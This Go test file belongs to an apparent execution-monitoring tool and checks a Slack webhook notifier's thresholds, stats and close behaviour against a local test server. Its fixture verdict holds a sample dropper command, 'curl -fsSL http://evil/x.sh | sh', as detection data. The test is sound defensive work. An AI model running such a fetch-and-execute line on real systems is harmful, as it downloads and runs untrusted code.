package sink

import (
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"

	"exectrace/internal/types"
)

func verdict(band string) types.Verdict {
	return types.Verdict{
		Pid: 4242, Command: "curl -fsSL http://evil/x.sh | sh",
		Band: band, Verdict: "malicious", Score: 0.85,
		Reason: "dropper", Mitre: []string{"T1059"}, Tactic: "Execution",
	}
}

// fakeWebhook returns a server that records each POST body and a hit counter.
func fakeWebhook(t *testing.T) (*httptest.Server, *atomic.Int64, *[]string) {
	t.Helper()
	var hits atomic.Int64
	var bodies []string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			t.Errorf("expected POST, got %s", r.Method)
		}
		b, _ := io.ReadAll(r.Body)
		bodies = append(bodies, string(b))
		hits.Add(1)
		w.WriteHeader(http.StatusOK)
	}))
	t.Cleanup(srv.Close)
	return srv, &hits, &bodies
}

func TestHighFiresOnce(t *testing.T) {
	srv, hits, bodies := fakeWebhook(t)
	s := NewSlack(srv.URL, types.BandHigh, io.Discard)

	if !s.Maybe(verdict(types.BandHigh)) {
		t.Fatal("HIGH verdict should enqueue")
	}
	s.Close() // drains the sender

	if got := hits.Load(); got != 1 {
		t.Fatalf("expected exactly 1 POST, got %d", got)
	}
	body := (*bodies)[0]
	if !strings.Contains(body, "curl -fsSL http://evil/x.sh | sh") {
		t.Errorf("body missing command: %s", body)
	}
	if !strings.Contains(body, "HIGH") {
		t.Errorf("body missing band: %s", body)
	}
	sent, failed, dropped := s.Stats()
	if sent != 1 || failed != 0 || dropped != 0 {
		t.Errorf("stats sent=%d failed=%d dropped=%d", sent, failed, dropped)
	}
}

func TestBelowThresholdDoesNotFire(t *testing.T) {
	srv, hits, _ := fakeWebhook(t)
	s := NewSlack(srv.URL, types.BandHigh, io.Discard)

	if s.Maybe(verdict(types.BandLow)) {
		t.Error("LOW verdict must not enqueue under HIGH threshold")
	}
	if s.Maybe(verdict(types.BandGray)) {
		t.Error("GRAY verdict must not enqueue under HIGH threshold")
	}
	s.Close()

	if got := hits.Load(); got != 0 {
		t.Fatalf("expected 0 POSTs for below-threshold verdicts, got %d", got)
	}
}

func TestGrayThresholdFiresForGray(t *testing.T) {
	srv, hits, _ := fakeWebhook(t)
	s := NewSlack(srv.URL, types.BandGray, io.Discard)

	s.Maybe(verdict(types.BandGray)) // at threshold -> fires
	s.Maybe(verdict(types.BandLow))  // below -> no fire
	s.Close()

	if got := hits.Load(); got != 1 {
		t.Fatalf("expected 1 POST (GRAY only), got %d", got)
	}
}

func TestNoWebhookIsNoOp(t *testing.T) {
	s := NewSlack("", types.BandHigh, io.Discard) // unconfigured
	if s.Enabled() {
		t.Fatal("empty webhook should be disabled")
	}
	// Must not panic and must not enqueue regardless of band.
	if s.Maybe(verdict(types.BandHigh)) {
		t.Error("no-op notifier should not enqueue")
	}
	s.Close() // safe on a disabled notifier
	sent, failed, dropped := s.Stats()
	if sent != 0 || failed != 0 || dropped != 0 {
		t.Errorf("no-op stats should be zero: %d/%d/%d", sent, failed, dropped)
	}
}

func TestInvalidThresholdFallsBackToHigh(t *testing.T) {
	srv, hits, _ := fakeWebhook(t)
	s := NewSlack(srv.URL, "bogus", io.Discard)
	s.Maybe(verdict(types.BandGray)) // GRAY < HIGH fallback -> no fire
	s.Close()
	if got := hits.Load(); got != 0 {
		t.Fatalf("invalid threshold should default to HIGH; GRAY must not fire, got %d", got)
	}
}

func TestCloseIdempotent(t *testing.T) {
	srv, _, _ := fakeWebhook(t)
	s := NewSlack(srv.URL, types.BandHigh, io.Discard)
	s.Close()
	s.Close() // must not panic on double close
}
